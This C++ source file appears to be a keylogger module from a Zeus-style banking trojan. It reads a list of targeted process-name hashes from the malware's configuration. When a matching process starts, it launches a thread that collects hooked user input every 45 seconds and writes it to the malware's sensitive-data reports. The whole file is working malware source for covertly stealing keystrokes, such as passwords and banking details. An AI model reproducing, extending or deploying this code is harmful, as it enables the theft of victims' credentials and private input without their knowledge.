#include <Windows.h>
#include <shlwapi.h>
#include <WinInet.h>

#include "defines.h"
#include "core.h"
#include "report.h"
#include "..\common\binstorage.h"
#include "dynamicconfig.h"
#include "..\common\str.h"
#include "userhook.h"
#include "..\common\debug.h"
#include "cryptedstrings.h"

#include "process_keylogger.h"

static LPSTR processNames;
static DWORD processNamesSize;
static LPWSTR inputBuffer;
static LPWSTR hash;

void ProcessKeylogger::init(void)
{
	if(processNames != NULL) {Mem::free(processNames); processNamesSize=0;}
	BinStorage::STORAGE* currcfg = DynamicConfig::getCurrent();
	if(currcfg != NULL)
	{
		processNames = (LPSTR)BinStorage::_getItemDataEx(currcfg, CFGID_PROCESS_KEY_LOGGER, BinStorage::ITEMF_IS_OPTION, &processNamesSize);
		if(processNames != NULL && !Str::_isValidMultiStringA(processNames, processNamesSize))
		{
			Mem::free(processNames);
		}
		Mem::free(currcfg);
	}

}

LPSTR ProcessKeylogger::_name2hash(LPSTR name)
{
	CharLowerBuffA(name, Str::_LengthA(name));
	LPSTR result;
	DWORD i = 0; DWORD local1=0, local2=0; DWORD eax=0,edx=0;
	while(name[i] != 0)
	{
		eax = local1;
		eax = eax<<0x7;
		eax = eax & 0xFFFFFFFF;
		edx = local1;
		edx = edx>>0x19;
		eax = eax | edx;
		local1 = eax;
		eax = name[i];
		local1 = local1 ^ eax;
		i++;
	}
	Str::_sprintfExA(&result, "0x%X", local1);
	return result;
}

void WINAPI proc(void* p)
{
	WCHAR objectName[50];
	Core::generateObjectName(Core::OBJECT_ID_REPORTS_SENSETIVE, objectName, MalwareTools::KON_SESSION);
	HANDLE event = CWA(kernel32, OpenEventW)(EVENT_MODIFY_STATE, FALSE, objectName);
	do
	{
		LPWSTR newbuffer;
		UserHook::getInput(&newbuffer);
		if(Str::_CompareW(newbuffer,inputBuffer,-1,-1) != 0)
		{
			CSTR_GETW(keyloggerReportFormat, keylogger_report_format);
			SetEvent(event); Mem::free(inputBuffer);inputBuffer = newbuffer;
			Report::writeStringFormat(BLT_KEYLOGGER,coreData.paths.process,0,keyloggerReportFormat, hash, inputBuffer);
		}
	} while(WaitForSingleObject(coreData.globalHandles.stopEvent, 45000) == WAIT_TIMEOUT);
}

void ProcessKeylogger::uninit(void)
{

}

void ProcessKeylogger::_checkProcessForLogging(LPSTR processName)
{
	if(processNames != NULL && processNamesSize != 0 && Str::_isValidMultiStringA(processNames, processNamesSize))
    {
		LPSTR name = _name2hash(processName);
		DWORD nameSize = Str::_LengthA(name);
		LPSTR curFilter = processNames;
		do if(curFilter[1] != 0)
		{
			if(Mem::_compare(curFilter, name, nameSize) == 0) {WDEBUG0(WDDT_INFO, "Started");hash = Str::_ansiToUnicodeEx(name,-1);CreateThread(0,0,(LPTHREAD_START_ROUTINE)proc,0,0,0);}
		} while((curFilter = Str::_multiStringGetIndexA(curFilter, 1)));
		Mem::free(name);
	}
	
}